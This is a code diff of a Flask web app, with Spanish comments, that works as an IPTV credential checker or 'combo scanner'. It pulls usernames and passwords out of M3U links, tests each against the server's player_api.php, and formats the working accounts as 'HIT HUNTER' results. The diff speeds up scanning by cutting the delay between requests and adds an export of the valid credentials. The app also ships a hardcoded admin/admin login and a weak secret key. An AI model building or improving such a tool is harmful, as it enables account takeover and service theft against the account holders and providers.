@@ -1,5 +1,6 @@
-from flask import Flask, render_template, request, jsonify, redirect, session
+from flask import Flask, render_template, request, jsonify, redirect, session, send_file
 import requests, time
+from datetime import datetime
 from db import get_db, init_db
 
 app = Flask(__name__)
@@ -7,7 +8,7 @@ app.secret_key = "secret123"
 
 init_db()
 
-# ===== CREAR USER =====
+# ===== USER =====
 db = get_db()
 try:
     db.execute("INSERT INTO users (user,pass) VALUES (?,?)", ("admin","admin"))
@@ -39,50 +40,70 @@ def logout():
 def auth():
     return "user" in session
 
-# ===== FORMATO SIMPLE =====
-def format_ok(user, password, base, exp):
+# ===== FORMATEAR FECHA =====
+def fmt_fecha(ts):
+    try:
+        return datetime.fromtimestamp(int(ts)).strftime('%d/%m/%Y')
+    except:
+        return "N/A"
+
+# ===== FORMATO FINAL =====
+def format_ok(c):
     return f"""╭───✦ HIT HUNTER
-├● 👑 ᴜꜱᴇʀ : {user}
-├● 🔐 ᴩᴀꜱꜱ : {password}
+├● 👑 ᴜꜱᴇʀ : {c['user']}
+├● 🔐 ᴩᴀꜱꜱ : {c['pass']}
 ├● ✅ ꜱᴛᴀᴛᴜꜱ : Active
-├● 📅 ᴇxᴘɪʀᴀᴛɪᴏɴ : {exp}
-├● 🌐 ꜱᴇʀᴠᴇʀ : {base}
-├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : panel
+├● 📶 ᴀᴄᴛɪᴠᴇ : {c['active']}
+├● 📡 ᴍᴀx : {c['max']}
+├● ⏰ ᴄʀᴇᴀᴛᴇᴅ : {c['created']}
+├● 📅 ᴇxᴘɪʀᴀᴛɪᴏɴ : {c['exp']}
+├● 🌐 ꜱᴇʀᴠᴇʀ : {c['server']}
+├● 🕰️ ᴛɪᴍᴇᴢᴏɴᴇ : {c['timezone']}
+├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : combo scanner
 ├● 👤 нιт вʏ : PANEL PRO
 ╰───✦ 🚀
 
-🌐 ᴍ3ᴜ : {base}/get.php?username={user}&password={password}&type=m3u
+🌐 ᴍ3ᴜ : {c['url']}
 """
 
-# ===== VERIFICAR =====
+# ===== VERIFICACIÓN MEJORADA =====
 def verificar(url):
     try:
-        if "username=" not in url:
-            return ("ERROR","❌ URL inválida")
-
         base = url.split("/get.php")[0]
         user = url.split("username=")[1].split("&")[0]
         password = url.split("password=")[1].split("&")[0]
 
         api = f"{base}/player_api.php?username={user}&password={password}"
 
-        r = requests.get(api, timeout=8)
+        r = requests.get(api, timeout=6)
 
         if r.status_code != 200:
-            return ("ERROR","❌ Sin respuesta")
+            return ("ERROR","❌ SIN RESPUESTA")
 
         data = r.json()
+
         info = data.get("user_info", {})
+        server = data.get("server_info", {})
 
         if info.get("auth") != 1:
-            return ("BAD","❌ Cuenta inválida")
+            return ("BAD","❌ INVALIDA")
 
-        exp = info.get("exp_date","N/A")
+        c = {
+            "user": user,
+            "pass": password,
+            "active": info.get("active_cons", "0"),
+            "max": info.get("max_connections", "0"),
+            "created": fmt_fecha(info.get("created_at")),
+            "exp": fmt_fecha(info.get("exp_date")),
+            "server": base,
+            "timezone": server.get("timezone","N/A"),
+            "url": url
+        }
 
-        return ("OK", format_ok(user,password,base,exp))
+        return ("OK", format_ok(c))
 
     except:
-        return ("ERROR","❌ Error de conexión")
+        return ("ERROR","❌ ERROR")
 
 # ===== HOME =====
 @app.route("/")
@@ -105,7 +126,7 @@ def add():
     db.commit()
     return jsonify({"ok":True})
 
-# ===== VERIFICAR =====
+# ===== VERIFICAR MÁS RÁPIDO =====
 @app.route("/verificar")
 def scan():
     db = get_db()
@@ -121,7 +142,7 @@ def scan():
                    (estado, resultado, l[0]))
         db.commit()
 
-        time.sleep(1)
+        time.sleep(0.3)  # 🔥 MÁS RÁPIDO (antes 1s)
 
     return jsonify({"ok":True})
 
@@ -135,6 +156,18 @@ def results():
         {"estado": l[2], "resultado": l[3]}
         for l in listas
     ])
+
+# ===== EXPORT TXT =====
+@app.route("/export")
+def export():
+    db = get_db()
+    listas = db.execute("SELECT * FROM listas WHERE estado='OK'").fetchall()
+
+    with open("validas.txt","w",encoding="utf-8") as f:
+        for l in listas:
+            f.write(l[3] + "\n\n")
+
+    return send_file("validas.txt", as_attachment=True)
 
 if __name__ == "__main__":
     app.run()
